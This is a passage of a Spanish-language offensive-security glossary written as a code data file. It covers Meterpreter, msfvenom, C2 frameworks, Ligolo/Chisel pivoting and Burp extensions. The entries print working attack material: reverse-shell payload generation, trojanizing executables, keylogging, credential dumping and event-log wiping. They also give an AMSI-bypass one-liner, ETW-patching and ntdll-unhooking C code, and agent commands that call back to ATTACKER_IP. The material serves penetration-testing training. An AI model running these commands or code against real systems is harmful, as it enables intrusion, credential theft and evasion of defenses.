      "Los payloads pueden ser **staged** (se envían en partes, más sigilosos) o **stageless** (un solo bloque). **Meterpreter** es un payload avanzado en memoria que ofrece migración de procesos, captura de teclas, pivoting y más, sin tocar disco.\n" +
      "> 💡 `windows/x64/meterpreter/reverse_tcp` es un payload staged clásico.",
    examples: [
      "getsystem en Meterpreter intenta escalar a SYSTEM.",
      "migrate para moverse a un proceso más estable.",
    ],
    related: ["Arquitectura de Metasploit", "Post-explotación", "Exploit y Payload"],
  },
  {
    id: 322,
    module: 29,
    term: "Post-explotación",
    short: "Lo que se hace tras ganar acceso: persistir, recolectar y pivotar.",
    detail:
      "Conseguir una shell es el principio. La **post-explotación** abarca: **escalar privilegios**, **recolectar credenciales/datos**, **mantener persistencia** y **pivotar** hacia otras máquinas. Es donde se materializa el impacto real de un compromiso.",
    examples: [
      "Volcar hashes con hashdump tras escalar.",
      "Usar la máquina comprometida como pivote a la red interna.",
    ],
    related: ["Payloads y Meterpreter", "Movimiento lateral"],
  },
  {
    id: 323,
    module: 29,
    term: "msfvenom",
    short: "El generador de payloads independientes de Metasploit.",
    detail:
      "**msfvenom** crea payloads autónomos (ejecutables, scripts, shellcode) para usar fuera de un exploit de Metasploit, con codificación opcional para evasión.\n" +
      "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe\n" +
      "> ⚠️ Los payloads sin ofuscar los detecta cualquier AV moderno.",
    examples: [
      "Generar un .exe con reverse shell para un laboratorio.",
      "Crear shellcode para inyectar en un exploit propio.",
    ],
    related: ["Payloads y Meterpreter", "Arquitectura de Metasploit", "PowerShell ofensivo"],
  },
  {
    id: 324,
    module: 29,
    term: "Meterpreter avanzado: migrate, extensions, priv escalation",
    short: "Sessions Meterpreter con extensions (kiwi, incognito, priv), migrate a proceso estable, portfwd/route, hashdump — el arsenal post-exploitation.",
    detail:
      "**Meterpreter** es el payload flagship de Metasploit. Corre in-memory (evita AV disk detection), con extensions modulares cargables on-demand.\n" +
      "\n**Comandos core:**\n" +
      "```\nsysinfo              # OS, arch, hostname\ngetuid               # user actual\ngetprivs             # privileges del token\nps                   # process list\nmigrate <PID>        # move a otro proceso (typically explorer.exe, svchost.exe)\nsysinfo              # info del target\nhashdump             # dump SAM (requiere SYSTEM)\nkeyscan_start        # keylogger\nkeyscan_dump\nscreenshot           # screenshot\nrun autoroute -s 10.0.0.0/24    # pivoting\nportfwd add -l 5555 -p 3389 -r 10.0.0.5   # port forward\nload kiwi            # load mimikatz extension\n```\n" +
      "\n**Extensiones críticas:**\n" +
      "\n**kiwi** (Mimikatz integrado):\n" +
      "```\nload kiwi\ncreds_all            # todos los creds (passwords, hashes, kerberos)\nlsa_dump_sam         # SAM hashes\nlsa_dump_secrets     # LSA secrets\ngolden_ticket_create # forge Kerberos golden ticket\n```\n" +
      "\n**incognito** (token manipulation):\n" +
      "```\nload incognito\nlist_tokens -u       # tokens de usuarios disponibles\nimpersonate_token DOMAIN\\admin   # impersonate → efectivo admin\nsteal_token <PID>    # steal token de un proceso admin\n```\n" +
      "\n**priv** (privilege escalation attempts):\n" +
      "```\nload priv\ngetsystem            # intenta 4 métodos automáticos de escalación a SYSTEM\ngetsystem -t 3       # específico técnica 3 (TokenDup)\n```\n" +
      "\n**Migrate — por qué es CRÍTICO:**\nEl proceso inicial (from exploit) suele ser inestable (crash cuando el user cierra Adobe Reader del phishing). Migrate a un proceso long-running:\n" +
      "```\nps -A x86 -S explorer.exe     # buscar\nmigrate 1234                   # PID de explorer.exe\n```\n\n**Post-modules (post-exploitation catálogo):**\n" +
      "```\nrun post/windows/gather/hashdump\nrun post/windows/gather/checkvm\nrun post/windows/gather/credentials/credential_collector\nrun post/multi/recon/local_exploit_suggester\nrun post/multi/manage/autoroute\n```\n" +
      "\n**Persistence (post-modules):**\n" +
      "```\nrun persistence -A -S -U -i 60 -p 4444 -r 10.0.0.100   # deprecado\n# Preferir moderno:\nrun post/windows/manage/persistence_exe\n```\nGeneran Registry Run keys, Scheduled Tasks, WMI subscriptions. Estas son **red flags obvias** — detectable por AV/EDR moderno.\n" +
      "\n**Anti-forensics:**\n" +
      "```\ntimestomp -m \"01/01/2020 00:00:00\" file.txt   # modificar timestamps\nclearev                                        # borra Windows event logs (⚠️ ruidoso)\n```\n" +
      "\n**Modernidad**: Meterpreter es **detectado por casi todo EDR moderno** (Defender for Endpoint, CrowdStrike, SentinelOne). Para engagements realistas, se usan alternativas modernas (Sliver, Havoc) o custom implants. Meterpreter sigue rey en OSCP y labs.\n" +
      "> 💡 **`migrate` PRIMERO** siempre. Un session muerto = perdiste el foothold.\n" +
      "> ⚠️ `clearev` y `hashdump` triggering audit rules obvias. Priorizar operational security over convenience.",
    examples: [
      "OSCP: `migrate` + `hashdump` es workflow standard post-getsystem.",
      "getsystem falla contra Win 10+ con UAC. Métodos manuales requeridos.",
      "kiwi golden_ticket: creds persistentes hasta cambio de krbtgt password (raro).",
    ],
    related: ["Payloads y Meterpreter", "Post-explotación", "Payloads y Meterpreter", "AAA (Autenticación, Autorización, Accounting)"],
  },
  {
    id: 325,
    module: 29,
    term: "msfvenom y payload generation moderna",
    short: "msfvenom genera payloads en 30+ formatos (exe, elf, apk, jsp, py, war, macho, hta). Encoding + obfuscation para evasión básica.",
    detail:
      "**msfvenom** es el generator de payloads de Metasploit — reemplazo de msfpayload+msfencode desde 2015.\n" +
      "\n**Syntax básica:**\n" +
      "```bash\nmsfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o <output>\n```\n" +
      "\n**Payloads más comunes:**\n" +
      "```\nwindows/x64/meterpreter/reverse_tcp        # 64-bit Windows Meterpreter\nwindows/meterpreter/reverse_https          # HTTPS callback (evade DPI)\nlinux/x64/shell_reverse_tcp                # Linux basic shell\nlinux/x64/meterpreter/reverse_tcp\nphp/meterpreter/reverse_tcp                # PHP webshell\njava/jsp_shell_reverse_tcp                 # JSP shell (Tomcat)\nandroid/meterpreter/reverse_tcp            # APK payload\nosx/x64/shell_reverse_tcp                  # macOS\ncmd/unix/reverse_python                    # Python one-liner\n```\n" +
      "\n**Staged vs Stageless:**\n" +
      "| | Staged (`meterpreter/reverse_tcp`) | Stageless (`meterpreter_reverse_tcp` — subrayado) |\n" +
      "|---|---|---|\n" +
      "| Size | Pequeño stub (~200 bytes) | Todo el DLL (~1MB) |\n" +
      "| Callback | Descarga stage 2 al conectar | Todo incluido |\n" +
      "| Firewall | Requiere 2 sesiones separadas | Una conexión |\n" +
      "| AV detection | Stub es signatureable | Payload full firmable |\n" +
      "\nStageless preferido en engagements egress-restricted; staged mejor evasión inicial.\n" +
      "\n**Formatos comunes:**\n" +
      "```\n-f exe        # Windows PE executable\n-f exe-only   # sin envoltorio de MSF template (más stealth)\n-f elf        # Linux ELF\n-f raw        # shellcode raw\n-f c          # shellcode en formato C\n-f csharp     # shellcode C#\n-f psh        # PowerShell script\n-f hta-psh    # HTA (HTML app) — vector clásico\n-f vbs        # VBScript\n-f war        # Java Web ARchive (Tomcat)\n-f apk        # Android package\n```\n" +
      "\n**Encoders (deprecados vs modernos):**\n" +
      "\n**Encoders clásicos de MSF** (todos detectados por AV moderno):\n" +
      "```\n-e x86/shikata_ga_nai   # polymorphic — el más popular, MUY detectado en 2024\n-e x86/alpha_upper       # ASCII printable\n-e x64/xor               # simple XOR\n-i 10                     # 10 iteraciones\n```\n\n**Realidad 2024**: `shikata_ga_nai` es **detectado por firma** en Defender/CrowdStrike/SentinelOne. Sirve para bypass básico o labs, no para engagements reales.\n" +
      "\n**Templates ejecutables:**\n" +
      "```bash\nmsfvenom -p ... -x /path/to/legit.exe -k -f exe   # inyecta en legit exe\n# -k keeps original functionality → user no nota nada\n```\n" +
      "\n**Alternativas modernas para evasión real:**\n" +
      "\n**Donut** — shellcode generator con encryption AES:\n" +
      "```bash\ndonut -f payload.exe -o payload.bin\n# Después inyectar bin en un loader custom en Nim/Rust/Go\n```\n" +
      "\n**ScareCrow** — shellcode loader con syscalls directas, evasion Defender:\n" +
      "```bash\nScareCrow -I payload.bin -Loader excel\n```\n" +
      "\n**PEzor** — packs de PEs con anti-analysis, unhook AMSI/ETW.\n" +
      "\n**Custom loaders en Nim/Rust/Go** (2023-2025 estándar): compilan a binaries menos detectables, syscalls directas, sin dependencia .NET (evita ETW/AMSI).\n" +
      "\n**Handler setup (msfconsole):**\n" +
      "```\nuse exploit/multi/handler\nset payload windows/x64/meterpreter/reverse_https\nset LHOST 0.0.0.0\nset LPORT 443\nset ExitOnSession false\nexploit -j\n```\n" +
      "\n**MSF DB (workspace/creds/notes tracking):**\n" +
      "```\nworkspace -a engagement-01\ndb_nmap -sV -sC target\nservices\nvulns\ncreds -u admin\nnotes\n```\n" +
      "> 💡 Para **OSCP** msfvenom basic es suficiente. Para **red team real** debés compilar tus propios loaders.\n" +
      "> ⚠️ **NO usar `-e shikata_ga_nai` esperando evasión** en 2024 — está signaturado hace años. Detecta hasta Defender free.",
    examples: [
      "OSCP: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=eth0 LPORT=443 -f exe -o payload.exe`.",
      "Red team real: msfvenom → donut → loader Nim custom → Defender miss.",
      "Golden path 2024: reverse_https en 443 (bypass DPI firewall + parece tráfico normal).",
    ],
    related: ["Arquitectura de Metasploit", "Exploit y Payload", "Meterpreter avanzado: migrate, extensions, priv escalation", "Sliver, Havoc y C2 modernos (post-Cobalt Strike)"],
  },
  {
    id: 326,
    module: 29,
    term: "AV/EDR evasion moderna: AMSI, ETW, syscall directas",
    short: "AV firma-based (2010s) → EDR behavioral (2020s). Evasión moderna requiere unhook, patch AMSI/ETW, y syscalls directas via user-mode.",
    detail:
      "En 2024 el paradigma cambió: **firma-based AV** (Defender clásico) fue reemplazado por **EDR** (Defender for Endpoint, CrowdStrike Falcon, SentinelOne, Cortex XDR) que **monitorea comportamiento** en runtime.\n" +
      "\n**Cómo funciona EDR moderno:**\n" +
      "1. **AMSI** (Antimalware Scan Interface) — Windows API que apps invocan para escanear strings antes de ejecutar (PowerShell, VBS, JS, .NET).\n" +
      "2. **ETW** (Event Tracing for Windows) — telemetría kernel-mode (process creation, DLL loads, network, registry).\n" +
      "3. **Kernel drivers** que hookean syscalls y monitor system calls.\n" +
      "4. **Cloud lookups** — hashes de binaries checked contra threat intel en tiempo real.\n" +
      "5. **ML behavioral analysis** — patterns de comportamiento anómalos.\n" +
      "\n**Técnicas de evasion modernas:**\n" +
      "\n**1. AMSI Bypass:**\n" +
      "```powershell\n# Classic — MUY detectado hoy\n[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n\n# Moderno — hardware breakpoint\n# https://github.com/RythmStick/AMSITrigger + moderno con syscall\n```\nParchar `amsiInitFailed = true` en memoria hace que AMSI reporte error y skip scanning.\n" +
      "\n**2. ETW Bypass:**\n" +
      "```c\n// Patch de la primera instrucción de ntdll!EtwEventWrite con `ret`\nvoid patch_etw() {\n    HMODULE ntdll = GetModuleHandle(\"ntdll.dll\");\n    void* etw = GetProcAddress(ntdll, \"EtwEventWrite\");\n    DWORD old;\n    VirtualProtect(etw, 1, PAGE_EXECUTE_READWRITE, &old);\n    *((unsigned char*)etw) = 0xC3;   // ret\n    VirtualProtect(etw, 1, old, &old);\n}\n```\nSin ETW, muchos EDR pierden visibilidad de kernel events.\n" +
      "\n**3. Syscalls directas (Hell's Gate, Halo's Gate):**\nEDR hookea funciones user-mode de ntdll.dll (NtCreateThreadEx, NtAllocateVirtualMemory). Bypasses:\n" +
      "```\n1. Leer ntdll.dll DESDE DISK (no la in-memory hookeada)\n2. Extraer syscall numbers de las functions\n3. Invocar syscalls directamente vía asm (`syscall` instruction)\n```\nHerramientas: **SysWhispers2/3**, **Hell's Gate**, **Halo's Gate**, **Recycled Gate**.\n" +
      "\n**4. Unhooking ntdll:**\n" +
      "```c\n// Sobrescribir ntdll.dll en memoria con la copia limpia del disk\nvoid unhook_ntdll() {\n    HANDLE file = CreateFileA(\"C:\\\\Windows\\\\System32\\\\ntdll.dll\", ...);\n    HANDLE map = CreateFileMappingA(file, ...);\n    void* clean_ntdll = MapViewOfFile(map, ...);\n    // Overwrite .text section de ntdll cargada con la del disk\n}\n```\n" +
      "\n**5. Process injection moderno:**\n" +
      "En vez de `CreateRemoteThread` (detectado), usar:\n" +
      "```\n- Early Bird APC injection (queued antes de que EDR hookee)\n- Process Doppelgänging (TxF transactions)\n- Process Herpaderping (modificar file entre create + resume)\n- Module Stomping (write en DLL legítimo cargado)\n- Threadless injection (no crear thread nuevo)\n```\n" +
      "\n**6. BYOVD** (Bring Your Own Vulnerable Driver):\nUn driver firmado (legit sign) pero vulnerable permite kernel-mode operations. Ejemplos:\n" +
      "```\ngmer.sys, procexp.sys, iqvw64e.sys (Intel), Vulnerable_Driver_Blocklist evasion\n```\nHerramientas: **KDMapper**, **EDRSandBlast**, **BadZure**.\n" +
      "\n**Frameworks / kits modernos:**\n" +
      "• **ScareCrow** — loader con syscalls + module stomping\n" +
      "• **PEzor** — packer con anti-analysis\n" +
      "• **Freeze.rs** — Rust loader con unhook\n" +
      "• **NimShellcodeInjector, Nimplant** — Nim payloads menos detectados por training data de EDR (más nuevo)\n" +
      "\n**MITRE ATT&CK reference:**\n" +
      "• T1562.001 Impair Defenses: Disable/Modify Tools (AMSI, ETW)\n" +
      "• T1055 Process Injection (12+ sub-técnicas)\n" +
      "• T1218 Signed Binary Proxy Execution (BYOVD relacionado)\n" +
      "\n> 💡 **Red team senior job market 2024**: dominar syscalls directas + unhooking + Nim/Rust loaders es el skillset esperado.\n" +
      "> ⚠️ Evasion techniques evolucionan rápido. Lo que funciona en Junio deja de funcionar en Octubre. **Continuous research required**.",
    examples: [
      "Sliver framework: syscalls directas + Nim loader out-of-box.",
      "CrowdStrike blocked 99% de shikata_ga_nai en 2020; hoy detecta >99% de Meterpreter payloads default.",
      "BadUSB + BYOVD combined: bypass total del EDR pero requiere physical access.",
    ],
    related: ["Meterpreter avanzado: migrate, extensions, priv escalation", "msfvenom y payload generation moderna", "Sliver, Havoc y C2 modernos (post-Cobalt Strike)", "PowerShell ofensivo"],
  },
  {
    id: 327,
    module: 29,
    term: "Sliver, Havoc y C2 modernos (post-Cobalt Strike)",
    short: "Sliver (open source, Go) y Havoc (open source, Rust/C++) son los sucesores libres del Cobalt Strike comercial. Metasploit se quedó atrás para red team real.",
    detail:
      "**Cobalt Strike** ($3500+/año) fue el C2 estándar de red team profesional durante 2015-2020. Cracked versions inundaron el ecosystem malicioso post-2020 (Conti, Ryuk usaban CS crackeado). Alternativas open-source modernas cambiaron el juego.\n" +
      "\n**Sliver (BishopFox, 2020):**\nEscrito en Go. Cross-platform (Linux, Windows, macOS). Client CLI + server + implants (beacons).\n" +
      "\n**Features:**\n" +
      "• **Multi-transport**: mTLS, HTTP(S), DNS, WireGuard, TCP pivots\n" +
      "• **Multiplayer** (varios operators sobre mismo team server)\n" +
      "• **Extension system** con módulos precompilados\n" +
      "• **Post-ex modules**: token manipulation, portfwd, procdump, screenshot, execute-assembly\n" +
      "• **Sacrificial process** (spawn/inject)\n" +
      "\n**Instalación + uso:**\n" +
      "```bash\nsudo bash -c 'wget https://sliver.sh/install; bash install'\nsliver-server              # inicia server\nsliver                     # cliente\n\n# En sliver client\ngenerate --os linux --arch amd64 --mtls 10.0.0.1:8888 --save /tmp/implant\nmtls --lport 8888\n# Ejecutar implant en target → aparece beacon\n\nbeacons                    # list active\nuse <beacon-id>\ninfo\nshell\nls\nprocdump --pid 1234\n```\n" +
      "\n**Havoc (C5pider, 2022):**\nRust/C++/Python. GUI-first (a diferencia de Sliver CLI). UI similar a Cobalt Strike (deliberado).\n" +
      "\n**Features:**\n" +
      "• **Demon agent** (implant) escrito en C\n" +
      "• Modular listener system (HTTP, HTTPS, SMB)\n" +
      "• **BOF support** (Beacon Object Files — código C in-process de CS)\n" +
      "• Python scripting engine para automation\n" +
      "\n**Merlin (2018):**\nC2 experimental en Go. HTTP/2 transport (unusual, hard to detect en 2018).\n" +
      "\n**Mythic (2020):**\nFramework multi-agent. Diferente approach: **múltiples C2 implants** (Apollo, Poseidon, Nimplant) plug-in en la misma plataforma. Docker-native.\n" +
      "\n**PoshC2 (2019):**\nPowerShell-based, community driven. Todavía usado en engagements Windows-heavy.\n" +
      "\n**Cobalt Strike (commercial):**\nSigue siendo #1 en red team profesional que tiene budget. Feature más maduro:\n" +
      "• **Malleable C2 profiles** — customizar cada byte del tráfico\n" +
      "• **Aggressor Script** — automation scripting\n" +
      "• **BOFs** (Beacon Object Files) — extender beacon in-process\n" +
      "• **Team collaboration** madura\n" +
      "• Support de HelpSystems\n" +
      "\n**Comparación práctica:**\n" +
      "| | Cobalt Strike | Sliver | Havoc | Metasploit |\n" +
      "|---|---|---|---|---|\n" +
      "| Costo | $$$$ | Gratis | Gratis | Gratis |\n" +
      "| Idioma | Java/C | Go | Rust/C++ | Ruby |\n" +
      "| Detection (2024) | Alta (crackeado + IoC) | Media | Media-baja | Alta (Meterpreter signaturado) |\n" +
      "| BOF support | ✅ nativo | Parcial | ✅ | ❌ |\n" +
      "| Multiplayer | ✅ | ✅ | ✅ | Limitado |\n" +
      "| Docs / community | Excelente (privada) | Buena, growing | Growing | Enorme |\n" +
      "| Learning curve | Media | Baja | Media-alta | Baja |\n" +
      "\n**Contexto legal:**\nUsar C2 sin autorización explícita del owner del target es **ilegal en la mayoría de jurisdicciones**. Solo en:\n" +
      "• Engagements con contrato firmado + scope explícito\n" +
      "• Red team interno con approval de management\n" +
      "• CTF/HTB/labs propios\n" +
      "• Investigación con targets propios\n" +
      "\n**Tendencia 2024-2025**: mucho movimiento a **custom C2 in-house** (compilados propios para evitar signatures conocidas), especialmente en top-tier APTs y state-sponsored.\n" +
      "> 💡 **Sliver** es lo que aprender en 2024 si tu carrera es red team.\n" +
      "> ⚠️ Todos estos frameworks son **flagged como malware por AV/EDR**. Nunca ejecutar en producción no autorizada.",
    examples: [
      "APT29 (Cozy Bear): usa custom C2 (Cobalt Strike modificado + implants propios).",
      "Conti / Ryuk ransomware: Cobalt Strike crackeado como stager principal.",
      "Sliver 2024: adoption creciente en pentest firms de tier 2-3 por ratio calidad/precio.",
    ],
    related: ["Arquitectura de Metasploit", "Meterpreter avanzado: migrate, extensions, priv escalation", "msfvenom y payload generation moderna", "AV/EDR evasion moderna: AMSI, ETW, syscall directas"],
  },
  {
    id: 328,
    module: 29,
    term: "Pivoting y proxy chains con Ligolo-ng y Chisel",
    short: "Post-compromise, atravesar segmentos de red aislados. Ligolo-ng (userland tun/tap) reemplazó a proxychains/SSH tunnels en 2023.",
    detail:
      "El **pivoting** es alcanzar redes internas desde una máquina comprometida en la DMZ. El paradigma moderno cambió de proxychains lento a userland VPNs.\n" +
      "\n**Escenario típico:**\n" +
      "```\n[Atacante] → [Internet] → [DMZ machine, comprometido] → [red interna 192.168.1.0/24]\n```\nEl atacante quiere escanear/explotar 192.168.1.0/24 sin exponer todo.\n" +
      "\n**Método clásico 1: SSH port forwarding**\n" +
      "```bash\n# Local forward: atacante → puerto local 8080 → target interno 192.168.1.5:80\nssh -L 8080:192.168.1.5:80 user@dmz-machine\n\n# Dynamic (SOCKS): atacante crea SOCKS proxy local\nssh -D 9050 user@dmz-machine\n# Uso: proxychains nmap -sT 192.168.1.5\n```\nProblema: requiere SSH creds/access, SOCKS TCP-only (no UDP, no ICMP → sin ping, sin nmap SYN).\n" +
      "\n**Método clásico 2: proxychains + Metasploit autoroute**\n" +
      "```\n# En Meterpreter session\nrun autoroute -s 192.168.1.0/24\n\n# Nuevo terminal MSF con proxy socks\nuse auxiliary/server/socks_proxy\nset SRVPORT 9050\nrun\n\n# Nmap externo via socks\nproxychains nmap -sT -Pn 192.168.1.5\n```\nSlow. TCP-only. Sin UDP scans.\n" +
      "\n**Ligolo-ng (2023, moderno):**\n\nCreator: Nicolas Chatelain. Reemplazo del original Ligolo. **Full userland tun/tap** vía TLS/QUIC.\n" +
      "\nWorkflow:\n" +
      "```bash\n# En atacante (proxy server)\n./proxy -selfcert\n\n# En target comprometido (agent)\n./agent -connect ATTACKER_IP:11601 -ignore-cert\n\n# En atacante — configurar routing\nsudo ip tuntap add user root mode tun ligolo\nsudo ip link set ligolo up\nsudo ip route add 192.168.1.0/24 dev ligolo\n\n# Ahora TODO tráfico del atacante a 192.168.1.0/24 pasa via el target\nnmap -sS -sV 192.168.1.5     # Nmap NORMAL, sin proxychains\ncurl http://192.168.1.5      # HTTP normal\nsmbclient //192.168.1.5      # SMB normal\n# Todo funciona: TCP, UDP, ICMP, cualquier protocolo\n```\n" +
      "\n**Ventajas:**\n" +
      "• Full TCP + UDP + ICMP support\n" +
      "• No requiere modificar comandos (no proxychains needed)\n" +
      "• Muy rápido (native networking)\n" +
      "• TLS/QUIC encrypted transport\n" +
      "• Cross-platform (Linux, Windows agent)\n" +
      "\n**Chisel (2018, sigue muy usado):**\n\nGo binary. HTTP/WebSocket tunneling. Popular en OSCP/HTB.\n" +
      "```bash\n# En atacante (server)\n./chisel server -p 8080 --reverse\n\n# En target (client, reverse)\n./chisel client ATTACKER:8080 R:socks\n\n# Uso: SOCKS proxy on atacante:1080\nproxychains nmap -sT 192.168.1.5\n```\nRápido y simple pero solo TCP + SOCKS.\n" +
      "\n**Alternativas específicas:**\n" +
      "\n**revsocks** (Go): reverse SOCKS con TLS.\n" +
      "**gost** (Go): swiss-army knife de tunneling — SOCKS5, HTTP proxy, WebSocket, TLS, transparente.\n" +
      "**iodine**: DNS tunneling (cuando solo DNS sale) — muy lento pero funcional.\n" +
      "**dns2tcp**, **dnscat2**: variantes DNS tunneling.\n" +
      "**Metasploit portfwd** (dentro de Meterpreter):\n" +
      "```\nportfwd add -l 8888 -p 3389 -r 192.168.1.5   # RDP forward\n```\n" +
      "\n**Frampton** (2023): C2 with built-in pivoting, Rust-based.\n" +
      "\n**Detection de pivoting (blue team):**\n" +
      "• **Netflow analysis**: Machine que suddenly hace traffic a range interna donde antes no.\n" +
      "• **Unusual protocols**: TLS a puertos raros (11601 de Ligolo), DNS outbound sostenido (iodine).\n" +
      "• **Beacon detection**: intervals regulares.\n" +
      "• **EDR con network telemetry**: process spawning connections a IPs internas.\n" +
      "\n> 💡 **Ligolo-ng is the OSCP 2024 preferred method** — funciona nativo con todas las tools.\n" +
      "> ⚠️ **DO NOT** pivotear más de necesario. Cada hop = más ruido y logs. Documentar cada action en engagements.",
    examples: [
      "OSCP AD segment: chain de 3 hops típico con Ligolo-ng.",
      "HTB pro labs: Ligolo-ng es standard para atravesar cluster segments.",
      "Real engagement: pivot desde web DMZ → internal servers → domain controller.",
    ],
    related: ["Post-explotación", "Sliver, Havoc y C2 modernos (post-Cobalt Strike)", "Meterpreter avanzado: migrate, extensions, priv escalation", "Herramientas de enumeración"],
  },

  // ── M30 · Burp Suite ─────────────────────────────────────────────────────
  {
    id: 330,
    module: 30,
    term: "Proxy e intercept",
    short: "Burp se sitúa entre el navegador y el servidor para ver y modificar cada petición.",
    detail:
      "El corazón de **Burp Suite** es su **proxy**: configurando el navegador para pasar por Burp, se **interceptan**, inspeccionan y **modifican** las peticiones HTTP/S al vuelo. Es la base de todo testing web manual.\n" +
      "> 💡 Requiere instalar el certificado CA de Burp en el navegador para ver el tráfico HTTPS.",
    examples: [
      "Interceptar un POST de login y alterar parámetros.",
      "Ver el tráfico oculto que hace el JavaScript de una SPA.",
    ],
    related: ["Repeater", "Intruder", "Scanner y extensiones"],
  },
  {
    id: 331,
    module: 30,
    term: "Repeater",
    short: "Reenvía y modifica una petición manualmente cuantas veces haga falta.",
    detail:
      "**Repeater** permite tomar una petición, **editarla y reenviarla** repetidamente para probar manualmente cómo responde el servidor. Es la herramienta clave para explorar vulnerabilidades (probar payloads de SQLi/XSS, manipular tokens) con precisión.",
    examples: [
      "Probar distintos payloads de SQLi en un parámetro.",
      "Manipular un id para verificar un IDOR.",
    ],
    related: ["Proxy e intercept", "Intruder", "SQL Injection"],
  },
  {
    id: 332,
    module: 30,
    term: "Intruder",
    short: "Automatiza el envío de muchas peticiones con payloads variables (fuzzing, brute force).",
    detail:
      "**Intruder** automatiza ataques sobre posiciones marcadas de una petición: **fuzzing** de parámetros, **fuerza bruta** de credenciales, enumeración. Define payloads y analiza las respuestas (longitud, código) para detectar anomalías.\n" +
      "> 💡 La versión Community de Burp limita la velocidad de Intruder; las Pro no.",
    examples: [
      "Brute force de un login con una lista de contraseñas.",
      "Fuzzear un parámetro para descubrir valores válidos.",
    ],
    related: ["Repeater", "Proxy e intercept", "Identification and Authentication Failures"],
  },
  {
    id: 333,
    module: 30,
    term: "Scanner y extensiones",
    short: "El escáner automático de Burp Pro y el ecosistema de extensiones BApp.",
    detail:
      "Burp **Pro** incluye un **Scanner** que detecta automáticamente vulnerabilidades comunes (XSS, SQLi, etc.). El **BApp Store** añade extensiones (Logger++, Autorize para IDOR, Active Scan++) que potencian el flujo. La filosofía: automatizar lo repetitivo, validar a mano lo crítico.",
    examples: [
      "Autorize para detectar fallos de control de acceso.",
      "Active Scan++ para ampliar la cobertura del scanner.",
    ],
    related: ["Proxy e intercept", "Escáneres de vulnerabilidades", "OWASP Top 10"],
  },
  {
    id: 334,
    module: 30,
    term: "Extensiones esenciales del BApp Store",
    short: "Autorize, JS Miner, Turbo Intruder, HTTP Request Smuggler, InQL, Logger++ — el arsenal que convierte Burp de proxy a plataforma de pentest completa.",
    detail:
      "Burp Suite Pro tiene un **BApp Store** con 300+ extensiones. Las esenciales del arsenal moderno:\n" +
      "\n**Autorize** — el más importante para BOLA/IDOR:\nEnvía cada request de la browsing session con las **cookies de otro user** (config del segundo user). Compara responses y detecta unauthorized access automático. Feature killer para APIs.\n" +
      "\n**AuthMatrix** — matriz de auth testing:\nDefiní N users y N endpoints; corre tests automatizados de qué user accede a qué endpoint. Ideal para reports formales de authorization coverage.\n" +
      "\n**JS Miner** — reconnaissance client-side:\nParsea todo el JS de la app en busca de: endpoints ocultos, API keys hardcoded, subdomains referenced, comments con TODO/FIXME, dev artifacts. Encuentra superficie que el crawler oficial no ve.\n" +
      "\n**HTTP Request Smuggler** (PortSwigger official):\nDe James Kettle. Detección automática de HRS (CL.TE, TE.CL, HTTP/2 downgrade). Ver M24 def #274.\n" +
      "\n**Turbo Intruder** — Python engine para race conditions:\nReemplaza el Intruder clásico cuando necesitás requests paralelos ultra-rápidos (10K req/sec+). Scripts Python configurables. Ver siguiente def.\n" +
      "\n**InQL** — GraphQL testing:\nAuto-introspection + Burp integration. Genera queries de todos los types. Ver M22 def #259.\n" +
      "\n**Logger++** — logging avanzado:\nLog agregado de todo el traffic con filtros complejos. Analytics de requests: qué endpoints se usan más, qué status codes aparecen, tabla ordenable.\n" +
      "\n**Active Scan++** (portswigger) — extiende el active scanner:\nAgrega checks para SSTI, blind XXE, JWT alg=none, ORM leakage, y ~20 payloads más que el scanner base.\n" +
      "\n**Param Miner** — ya visto en M24 def #275 para cache poisoning:\nDescubre parámetros ocultos + headers no incluidos en cache key.\n" +
      "\n**Piper** — pipe requests a herramientas externas:\nPodés mandar cualquier request a `sqlmap`, `ffuf`, `curl`, `nuclei` con un click derecho. Integra Burp con el resto del toolkit CLI.\n" +
      "\n**Otras útiles:**\n" +
      "• **Retire.js** — detecta librerías JS con CVEs conocidos\n" +
      "• **Wappalyzer** — tech stack fingerprinting\n" +
      "• **Reflected Parameters** — detecta params que se reflejan en response (XSS surface)\n" +
      "• **Software Version Reporter** — versiones detectadas → CVE lookups\n" +
      "• **JWT Editor** — decode + edit + sign JWTs desde Repeater\n" +
      "> 💡 **Autorize** ahorra días de manual testing en APIs modernas. Investment #1 en engagements con APIs.\n" +
      "> ⚠️ Extensiones community pueden lag entre updates de Burp Pro. Verificar compatibilidad de versión.",
    examples: [
      "Autorize en API con 20 endpoints × 3 roles: detecta BOLAs en minutos vs horas manual.",
      "JS Miner sobre SPA React: descubre `/api/internal/debug` endpoint no linked en UI.",
      "Turbo Intruder para race condition en cupón de descuento: 100 requests paralelos → precio negativo.",
    ],
    related: ["Proxy e intercept", "BOLA / IDOR y Broken Object Level Auth", "GraphQL security", "Turbo Intruder + race conditions"],
  },
  {
    id: 335,
    module: 30,
    term: "Turbo Intruder + race conditions",
    short: "Python-based intruder para requests paralelos ultra-rápidos. Race condition testing, credential stuffing, HTTP smuggling.",
    detail:
      "El **Intruder clásico de Burp** manda requests secuenciales — ~40 req/sec en el mejor caso. Para vectores donde el tiempo importa (races, HTTP smuggling PoC), es demasiado lento. **Turbo Intruder** (PortSwigger, James Kettle 2018) fue creado para esto.\n" +
      "\n**Arquitectura:**\n" +
      "• **Motor Jython** (Python 2.7 wrapper) para configuración.\n" +
      "• **HTTP engine custom** que abre múltiples TCP connections + HTTP/2 multiplexing.\n" +
      "• Hasta **10,000+ req/sec** contra targets locales; **1000+** contra Internet.\n" +
      "\n**Casos de uso primarios:**\n" +
      "\n**1. Race conditions:**\n" +
      "```python\ndef queueRequests(target, wordlists):\n    engine = RequestEngine(endpoint=target.endpoint,\n                           concurrentConnections=100,\n                           requestsPerConnection=100,\n                           pipeline=False)\n    # 30 requests en paralelo con el mismo cupón\n    for i in range(30):\n        engine.queue(target.req)\n\ndef handleResponse(req, interesting):\n    if 'success' in req.response:\n        table.add(req)\n```\nSi el server no tiene locking, el cupón se aplica 30 veces en vez de 1.\n" +
      "\n**2. Single-packet attack (Kettle 2020):**\n" +
      "Técnica avanzada: enviar múltiples requests HTTP/2 en un **solo paquete TCP**. Eliminates network jitter — todos los requests llegan al server simultáneamente. Descubre races imposibles con métodos tradicionales.\n" +
